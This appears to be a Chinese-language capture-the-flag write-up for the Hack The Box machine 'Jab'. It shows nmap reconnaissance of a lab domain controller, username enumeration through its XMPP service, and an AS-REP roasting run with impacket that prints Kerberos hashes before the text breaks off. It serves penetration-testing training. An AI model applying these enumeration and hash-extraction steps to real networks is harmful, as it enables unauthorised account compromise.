[{"title":"Jab - Hackthebox","url":"/2024/02/25/Hackthebox/Medium/Jab/","content":"\n# 靶场信息\n\n![Jab](Jab/Jab.png)\n\n# 信息收集\n\n## Nmap\n\n```\n┌──(root㉿kali)-[~]\n└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.4\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 08:53 CST\nNmap scan report for 10.10.11.4\nHost is up (0.16s latency).\nNot shown: 41978 closed tcp ports (reset), 23523 filtered tcp ports (no-response)\nPORT      STATE SERVICE             VERSION\n53/tcp    open  domain              Simple DNS Plus\n88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-02-26 00:55:01Z)\n135/tcp   open  msrpc               Microsoft Windows RPC\n139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-02-26T00:58:54+00:00; -1s from scanner time.\n| ssl-cert: Subject: commonName=DC01.jab.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb\n| Not valid before: 2023-11-01T20:16:18\n|_Not valid after:  2024-10-31T20:16:18\n3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-02-26T00:58:51+00:00; -1s from scanner time.\n| ssl-cert: Subject: commonName=DC01.jab.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb\n| Not valid before: 2023-11-01T20:16:18\n|_Not valid after:  2024-10-31T20:16:18\n5222/tcp  open  jabber\n| xmpp-info: \n|   STARTTLS Failed\n|   info: \n|     unknown: \n|     stream_id: aaq5hb7f8h\n|     features: \n|     auth_mechanisms: \n|     errors: \n|       invalid-namespace\n|       (timeout)\n|     xmpp: \n|       version: 1.0\n|     capabilities: \n|_    compression_methods: \n|_ssl-date: TLS randomness does not represent time\n| fingerprint-strings: \n|   RPCCheck: \n|_    <stream:error xmlns:stream=\"http://etherx.jabber.org/streams\"><not-well-formed xmlns=\"urn:ietf:params:xml:ns:xmpp-streams\"/></stream:error></stream:stream>\n5223/tcp  open  ssl/hpvirtgrp?\n| ssl-cert: Subject: commonName=dc01.jab.htb\n| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb\n| Not valid before: 2023-10-26T22:00:12\n|_Not valid after:  2028-10-24T22:00:12\n|_ssl-date: TLS randomness does not represent time\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LPDString, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe: \n|_    <stream:error xmlns:stream=\"http://etherx.jabber.org/streams\"><not-well-formed xmlns=\"urn:ietf:params:xml:ns:xmpp-streams\"/></stream:error></stream:stream>\n5262/tcp  open  jabber\n| xmpp-info: \n|   STARTTLS Failed\n|   info: \n|     unknown: \n|     stream_id: 4wa3lpexi3\n|     features: \n|     auth_mechanisms: \n|     errors: \n|       invalid-namespace\n|       (timeout)\n|     xmpp: \n|       version: 1.0\n|     capabilities: \n|_    compression_methods: \n| fingerprint-strings: \n|   RPCCheck: \n|_    <stream:error xmlns:stream=\"http://etherx.jabber.org/streams\"><not-well-formed xmlns=\"urn:ietf:params:xml:ns:xmpp-streams\"/></stream:error></stream:stream>\n5263/tcp  open  ssl/unknown\n|_ssl-date: TLS randomness does not represent time\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: \n|_    <stream:error xmlns:stream=\"http://etherx.jabber.org/streams\"><not-well-formed xmlns=\"urn:ietf:params:xml:ns:xmpp-streams\"/></stream:error></stream:stream>\n| ssl-cert: Subject: commonName=dc01.jab.htb\n| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb\n| Not valid before: 2023-10-26T22:00:12\n|_Not valid after:  2028-10-24T22:00:12\n5269/tcp  open  xmpp                Wildfire XMPP Client\n| xmpp-info: \n|   STARTTLS Failed\n|   info: \n|     unknown: \n|     features: \n|     auth_mechanisms: \n|     errors: \n|       (timeout)\n|     xmpp: \n|     capabilities: \n|_    compression_methods: \n5270/tcp  open  ssl/xmpp            Wildfire XMPP Client\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=dc01.jab.htb\n| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb\n| Not valid before: 2023-10-26T22:00:12\n|_Not valid after:  2028-10-24T22:00:12\n5275/tcp  open  jabber\n| fingerprint-strings: \n|   RPCCheck: \n|_    <stream:error xmlns:stream=\"http://etherx.jabber.org/streams\"><not-well-formed xmlns=\"urn:ietf:params:xml:ns:xmpp-streams\"/></stream:error></stream:stream>\n| xmpp-info: \n|   STARTTLS Failed\n|   info: \n|     unknown: \n|     stream_id: 50ipmcpaef\n|     features: \n|     auth_mechanisms: \n|     errors: \n|       invalid-namespace\n|       (timeout)\n|     xmpp: \n|       version: 1.0\n|     capabilities: \n|_    compression_methods: \n5276/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later\n| ssl-cert: Subject: commonName=dc01.jab.htb\n| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb\n| Not valid before: 2023-10-26T22:00:12\n|_Not valid after:  2028-10-24T22:00:12\n|_ssl-date: TLS randomness does not represent time\n| xmpp-info: \n|   STARTTLS Failed\n|   info: \n|     unknown: \n|     features: \n|     auth_mechanisms: \n|     errors: \n|       (timeout)\n|     xmpp: \n|     capabilities: \n|_    compression_methods: \n5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n7070/tcp  open  realserver?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP: \n|     HTTP/1.1 400 Illegal character CNTL=0x0\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 69\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>\n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     Date: Mon, 26 Feb 2024 00:54:58 GMT\n|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT\n|     Content-Type: text/html\n|     Accept-Ranges: bytes\n|     Content-Length: 223\n|     <html>\n|     <head><title>Openfire HTTP Binding Service</title></head>\n|     <body><font face=\"Arial, Helvetica\"><b>Openfire <a href=\"http://www.xmpp.org/extensions/xep-0124.html\">HTTP Binding</a> Service</b></font></body>\n|     </html>\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     Date: Mon, 26 Feb 2024 00:55:07 GMT\n|     Allow: GET,HEAD,POST,OPTIONS\n|   Help: \n|     HTTP/1.1 400 No URI\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 49\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>\n|   RPCCheck: \n|     HTTP/1.1 400 Illegal character OTEXT=0x80\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 71\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>\n|   RTSPRequest: \n|     HTTP/1.1 505 Unknown Version\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 58\n|     Connection: close\n|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>\n|   SSLSessionReq: \n|     HTTP/1.1 400 Illegal character CNTL=0x16\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 70\n|     Connection: close\n|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>\n7443/tcp  open  ssl/oracleas-https?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP: \n|     HTTP/1.1 400 Illegal character CNTL=0x0\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 69\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>\n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     Date: Mon, 26 Feb 2024 00:55:09 GMT\n|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT\n|     Content-Type: text/html\n|     Accept-Ranges: bytes\n|     Content-Length: 223\n|     <html>\n|     <head><title>Openfire HTTP Binding Service</title></head>\n|     <body><font face=\"Arial, Helvetica\"><b>Openfire <a href=\"http://www.xmpp.org/extensions/xep-0124.html\">HTTP Binding</a> Service</b></font></body>\n|     </html>\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     Date: Mon, 26 Feb 2024 00:55:21 GMT\n|     Allow: GET,HEAD,POST,OPTIONS\n|   Help: \n|     HTTP/1.1 400 No URI\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 49\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>\n|   RPCCheck: \n|     HTTP/1.1 400 Illegal character OTEXT=0x80\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 71\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>\n|   RTSPRequest: \n|     HTTP/1.1 505 Unknown Version\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 58\n|     Connection: close\n|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>\n|   SSLSessionReq: \n|     HTTP/1.1 400 Illegal character CNTL=0x16\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 70\n|     Connection: close\n|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=dc01.jab.htb\n| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb\n| Not valid before: 2023-10-26T22:00:12\n|_Not valid after:  2028-10-24T22:00:12\n7777/tcp  open  socks5              (No authentication; connection not allowed by ruleset)\n| socks-auth-info: \n|_  No authentication\n9389/tcp  open  mc-nmf              .NET Message Framing\n47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n49664/tcp open  msrpc               Microsoft Windows RPC\n49665/tcp open  msrpc               Microsoft Windows RPC\n49666/tcp open  msrpc               Microsoft Windows RPC\n49667/tcp open  msrpc               Microsoft Windows RPC\n49671/tcp open  msrpc               Microsoft Windows RPC\n49678/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0\n49679/tcp open  msrpc               Microsoft Windows RPC\n49680/tcp open  msrpc               Microsoft Windows RPC\n49685/tcp open  msrpc               Microsoft Windows RPC\n49831/tcp open  msrpc               Microsoft Windows RPC\n50696/tcp open  msrpc               Microsoft Windows RPC\n7 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port5222-TCP:V=7.94SVN%I=7%D=2/26%Time=65DBE17A%P=x86_64-pc-linux-gnu%r\nSF:(RPCCheck,9B,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.or\nSF:g/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-str\nSF:eams\\\"/></stream:error></stream:stream>\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port5223-TCP:V=7.94SVN%T=SSL%I=7%D=2/26%Time=65DBE1A3%P=x86_64-pc-linux\nSF:-gnu%r(DNSVersionBindReqTCP,9B,\"<stream:error\\x20xmlns:stream=\\\"http://\nSF:etherx\\.jabber\\.org/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:para\nSF:ms:xml:ns:xmpp-streams\\\"/></stream:error></stream:stream>\")%r(DNSStatus\nSF:RequestTCP,9B,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.o\nSF:rg/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-st\nSF:reams\\\"/></stream:error></stream:stream>\")%r(SSLSessionReq,9B,\"<stream:\nSF:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.org/streams\\\"><not-well-\nSF:formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-streams\\\"/></stream:error\nSF:></stream:stream>\")%r(TLSSessionReq,9B,\"<stream:error\\x20xmlns:stream=\\\nSF:\"http://etherx\\.jabber\\.org/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:i\nSF:etf:params:xml:ns:xmpp-streams\\\"/></stream:error></stream:stream>\")%r(K\nSF:erberos,9B,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.org/\nSF:streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-strea\nSF:ms\\\"/></stream:error></stream:stream>\")%r(SMBProgNeg,9B,\"<stream:error\\\nSF:x20xmlns:stream=\\\"http://etherx\\.jabber\\.org/streams\\\"><not-well-formed\nSF:\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-streams\\\"/></stream:error></str\nSF:eam:stream>\")%r(X11Probe,9B,\"<stream:error\\x20xmlns:stream=\\\"http://eth\nSF:erx\\.jabber\\.org/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:\nSF:xml:ns:xmpp-streams\\\"/></stream:error></stream:stream>\")%r(LPDString,9B\nSF:,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.org/streams\\\">\nSF:<not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-streams\\\"/></st\nSF:ream:error></stream:stream>\")%r(LDAPBindReq,9B,\"<stream:error\\x20xmlns:\nSF:stream=\\\"http://etherx\\.jabber\\.org/streams\\\"><not-well-formed\\x20xmlns\nSF:=\\\"urn:ietf:params:xml:ns:xmpp-streams\\\"/></stream:error></stream:strea\nSF:m>\")%r(LANDesk-RC,9B,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.ja\nSF:bber\\.org/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:\nSF:xmpp-streams\\\"/></stream:error></stream:stream>\")%r(TerminalServer,9B,\"\nSF:<stream:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.org/streams\\\"><n\nSF:ot-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-streams\\\"/></stre\nSF:am:error></stream:stream>\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port5262-TCP:V=7.94SVN%I=7%D=2/26%Time=65DBE17A%P=x86_64-pc-linux-gnu%r\nSF:(RPCCheck,9B,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.or\nSF:g/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-str\nSF:eams\\\"/></stream:error></stream:stream>\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port5263-TCP:V=7.94SVN%T=SSL%I=7%D=2/26%Time=65DBE1A3%P=x86_64-pc-linux\nSF:-gnu%r(DNSVersionBindReqTCP,9B,\"<stream:error\\x20xmlns:stream=\\\"http://\nSF:etherx\\.jabber\\.org/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:para\nSF:ms:xml:ns:xmpp-streams\\\"/></stream:error></stream:stream>\")%r(DNSStatus\nSF:RequestTCP,9B,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.o\nSF:rg/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-st\nSF:reams\\\"/></stream:error></stream:stream>\")%r(SSLSessionReq,9B,\"<stream:\nSF:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.org/streams\\\"><not-well-\nSF:formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-streams\\\"/></stream:error\nSF:></stream:stream>\")%r(TerminalServerCookie,9B,\"<stream:error\\x20xmlns:s\nSF:tream=\\\"http://etherx\\.jabber\\.org/streams\\\"><not-well-formed\\x20xmlns=\nSF:\\\"urn:ietf:params:xml:ns:xmpp-streams\\\"/></stream:error></stream:stream\nSF:>\")%r(TLSSessionReq,9B,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.\nSF:jabber\\.org/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:n\nSF:s:xmpp-streams\\\"/></stream:error></stream:stream>\")%r(Kerberos,9B,\"<str\nSF:eam:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.org/streams\\\"><not-w\nSF:ell-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-streams\\\"/></stream:e\nSF:rror></stream:stream>\")%r(SMBProgNeg,9B,\"<stream:error\\x20xmlns:stream=\nSF:\\\"http://etherx\\.jabber\\.org/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:\nSF:ietf:params:xml:ns:xmpp-streams\\\"/></stream:error></stream:stream>\")%r(\nSF:X11Probe,9B,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.org\nSF:/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-stre\nSF:ams\\\"/></stream:error></stream:stream>\")%r(LDAPBindReq,9B,\"<stream:erro\nSF:r\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.org/streams\\\"><not-well-form\nSF:ed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-streams\\\"/></stream:error></s\nSF:tream:stream>\")%r(LANDesk-RC,9B,\"<stream:error\\x20xmlns:stream=\\\"http:/\nSF:/etherx\\.jabber\\.org/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:par\nSF:ams:xml:ns:xmpp-streams\\\"/></stream:error></stream:stream>\")%r(Terminal\nSF:Server,9B,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.org/s\nSF:treams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-stream\nSF:s\\\"/></stream:error></stream:stream>\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port5275-TCP:V=7.94SVN%I=7%D=2/26%Time=65DBE17A%P=x86_64-pc-linux-gnu%r\nSF:(RPCCheck,9B,\"<stream:error\\x20xmlns:stream=\\\"http://etherx\\.jabber\\.or\nSF:g/streams\\\"><not-well-formed\\x20xmlns=\\\"urn:ietf:params:xml:ns:xmpp-str\nSF:eams\\\"/></stream:error></stream:stream>\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port7070-TCP:V=7.94SVN%I=7%D=2/26%Time=65DBE163%P=x86_64-pc-linux-gnu%r\nSF:(GetRequest,189,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x2026\\x20Feb\\x\nSF:202024\\x2000:54:58\\x20GMT\\r\\nLast-Modified:\\x20Wed,\\x2016\\x20Feb\\x20202\nSF:2\\x2015:55:02\\x20GMT\\r\\nContent-Type:\\x20text/html\\r\\nAccept-Ranges:\\x2\nSF:0bytes\\r\\nContent-Length:\\x20223\\r\\n\\r\\n<html>\\n\\x20\\x20<head><title>Op\nSF:enfire\\x20HTTP\\x20Binding\\x20Service</title></head>\\n\\x20\\x20<body><fon\nSF:t\\x20face=\\\"Arial,\\x20Helvetica\\\"><b>Openfire\\x20<a\\x20href=\\\"http://ww\nSF:w\\.xmpp\\.org/extensions/xep-0124\\.html\\\">HTTP\\x20Binding</a>\\x20Service\nSF:</b></font></body>\\n</html>\\n\")%r(RTSPRequest,AD,\"HTTP/1\\.1\\x20505\\x20U\nSF:nknown\\x20Version\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nC\nSF:ontent-Length:\\x2058\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\\nSF:x20505</h1><pre>reason:\\x20Unknown\\x20Version</pre>\")%r(HTTPOptions,56,\nSF:\"HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x2026\\x20Feb\\x202024\\x2000:55:\nSF:07\\x20GMT\\r\\nAllow:\\x20GET,HEAD,POST,OPTIONS\\r\\n\\r\\n\")%r(RPCCheck,C7,\"H\nSF:TTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20OTEXT=0x80\\r\\nContent-Type:\\\nSF:x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2071\\r\\nConnection:\nSF:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Illegal\\\nSF:x20character\\x20OTEXT=0x80</pre>\")%r(DNSVersionBindReqTCP,C3,\"HTTP/1\\.1\nSF:\\x20400\\x20Illegal\\x20character\\x20CNTL=0x0\\r\\nContent-Type:\\x20text/ht\nSF:ml;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Illegal\\x20charact\nSF:er\\x20CNTL=0x0</pre>\")%r(DNSStatusRequestTCP,C3,\"HTTP/1\\.1\\x20400\\x20Il\nSF:legal\\x20character\\x20CNTL=0x0\\r\\nContent-Type:\\x20text/html;charset=is\nSF:o-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Ba\nSF:d\\x20Message\\x20400</h1><pre>reason:\\x20Illegal\\x20character\\x20CNTL=0x\nSF:0</pre>\")%r(Help,9B,\"HTTP/1\\.1\\x20400\\x20No\\x20URI\\r\\nContent-Type:\\x20\nSF:text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2049\\r\\nConnection:\\x2\nSF:0close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20No\\x20URI</\nSF:pre>\")%r(SSLSessionReq,C5,\"HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20\nSF:CNTL=0x16\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nContent-L\nSF:ength:\\x2070\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</\nSF:h1><pre>reason:\\x20Illegal\\x20character\\x20CNTL=0x16</pre>\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port7443-TCP:V=7.94SVN%T=SSL%I=7%D=2/26%Time=65DBE16E%P=x86_64-pc-linux\nSF:-gnu%r(GetRequest,189,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x2026\\x2\nSF:0Feb\\x202024\\x2000:55:09\\x20GMT\\r\\nLast-Modified:\\x20Wed,\\x2016\\x20Feb\\\nSF:x202022\\x2015:55:02\\x20GMT\\r\\nContent-Type:\\x20text/html\\r\\nAccept-Rang\nSF:es:\\x20bytes\\r\\nContent-Length:\\x20223\\r\\n\\r\\n<html>\\n\\x20\\x20<head><ti\nSF:tle>Openfire\\x20HTTP\\x20Binding\\x20Service</title></head>\\n\\x20\\x20<bod\nSF:y><font\\x20face=\\\"Arial,\\x20Helvetica\\\"><b>Openfire\\x20<a\\x20href=\\\"htt\nSF:p://www\\.xmpp\\.org/extensions/xep-0124\\.html\\\">HTTP\\x20Binding</a>\\x20S\nSF:ervice</b></font></body>\\n</html>\\n\")%r(HTTPOptions,56,\"HTTP/1\\.1\\x2020\nSF:0\\x20OK\\r\\nDate:\\x20Mon,\\x2026\\x20Feb\\x202024\\x2000:55:21\\x20GMT\\r\\nAll\nSF:ow:\\x20GET,HEAD,POST,OPTIONS\\r\\n\\r\\n\")%r(RTSPRequest,AD,\"HTTP/1\\.1\\x205\nSF:05\\x20Unknown\\x20Version\\r\\nContent-Type:\\x20text/html;charset=iso-8859\nSF:-1\\r\\nContent-Length:\\x2058\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20M\nSF:essage\\x20505</h1><pre>reason:\\x20Unknown\\x20Version</pre>\")%r(RPCCheck\nSF:,C7,\"HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20OTEXT=0x80\\r\\nContent-\nSF:Type:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2071\\r\\nConne\nSF:ction:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Il\nSF:legal\\x20character\\x20OTEXT=0x80</pre>\")%r(DNSVersionBindReqTCP,C3,\"HTT\nSF:P/1\\.1\\x20400\\x20Illegal\\x20character\\x20CNTL=0x0\\r\\nContent-Type:\\x20t\nSF:ext/html;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20\nSF:close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Illegal\\x20c\nSF:haracter\\x20CNTL=0x0</pre>\")%r(DNSStatusRequestTCP,C3,\"HTTP/1\\.1\\x20400\nSF:\\x20Illegal\\x20character\\x20CNTL=0x0\\r\\nContent-Type:\\x20text/html;char\nSF:set=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\n\nSF:<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Illegal\\x20character\\x20C\nSF:NTL=0x0</pre>\")%r(Help,9B,\"HTTP/1\\.1\\x20400\\x20No\\x20URI\\r\\nContent-Typ\nSF:e:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2049\\r\\nConnecti\nSF:on:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20No\\x2\nSF:0URI</pre>\")%r(SSLSessionReq,C5,\"HTTP/1\\.1\\x20400\\x20Illegal\\x20charact\nSF:er\\x20CNTL=0x16\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nCon\nSF:tent-Length:\\x2070\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x2\nSF:0400</h1><pre>reason:\\x20Illegal\\x20character\\x20CNTL=0x16</pre>\");\nAggressive OS guesses: Microsoft Windows Server 2019 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2008 SP2 (90%), Microsoft Windows Vista SP1 (89%), Microsoft Windows 10 1709 - 1909 (89%), Microsoft Windows Server 2012 R2 (88%), Microsoft Windows XP SP3 (88%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (88%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -1s, deviation: 0s, median: -1s\n| smb2-time: \n|   date: 2024-02-26T00:58:32\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using port 554/tcp)\nHOP RTT       ADDRESS\n1   143.68 ms 10.10.16.1\n2   144.22 ms 10.10.11.4\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 351.72 seconds\n```\n\n东西还真不少，首先我们把域名都给提取出来，然后写一个 hosts\n\n```\necho \"10.10.11.4 jab.htb dc01.jab.htb\" >> /etc/hosts\n```\n\n这里发现有 xmpp，我们使用 Adium 进行连接，先去注册个账号\n\n![image-20240227095536824](Jab/image-20240227095536824.png)\n\n![image-20240227100234871](Jab/image-20240227100234871.png)\n\n查看服务侦测浏览器，发现有一个 search\n\n搜索 “*”\n\n![image-20240227100326559](Jab/image-20240227100326559.png)\n\n发现了好多用户名，想办法给它们搞下来，大家各显神通吧\n\n一共两千六百多行，太多了，我就不贴上来了\n\n如果觉得不太方便的还可以用 pidgin 进行登录，然后导出日志以后，用 grep 进行过滤\n\n# 漏洞利用\n\n然后使用 impacket 的脚本进行进行爆破\n\n> https://github.com/fortra/impacket\n\n```\n┌──(root㉿kali)-[~]\n└─# ./impacket/examples/GetNPUsers.py jab.htb/ -usersfile users.txt -outputfile outputusers.txt -dc-ip 10.10.11.4 -no-pass\nImpacket v0.11.0 - Copyright 2023 Fortra\n```\n\n找到了三个可用账户\n\n```\n$krb5asrep$23$jmontgomery@jab.htb@JAB.HTB:3ab8a6a20b0f5e8e7971c62e9c2b3e25$477d81abb2ccfd5efc1941eb4edec536833aabb063a9ec2a0e2867232f0177b2ee0c7c8f757ff3e4db1c4c810f4dcd1d2644149393892dedc93ca62630a1ec75debcc1cfa520f181dc117e1a51806bb5657b857d38452eef375f6da8232e14e085dc24adb7686739c323b2615e446370d006512ec576616e0c5ee7038eeecaf6bfe7afdf6836605bf37d159cf92cdf499b116b3890f70ab78106873a03fc03ba998cbff13842e0e9291902151a681a6574cbba8e88344fa154c149e9ef7687c241c092a0f4f5d0cbc5d7affe31f3f1463295305dfb2b921e11ecec48ca40b8ded32d\n$krb5asrep$23$lbradford@jab.htb@JAB.HTB:1a70c7ef28898eb69245b00d0571731d$9e9eaa379c786a0167103a6117294c21033b96bd5f34a48e32b3f8952a1b752dd65de4a16a0acc871932a55240ad6be54beebdd1f47c98c39f1eb3c53d8760399b5a8ef9b11f239d53536572e5403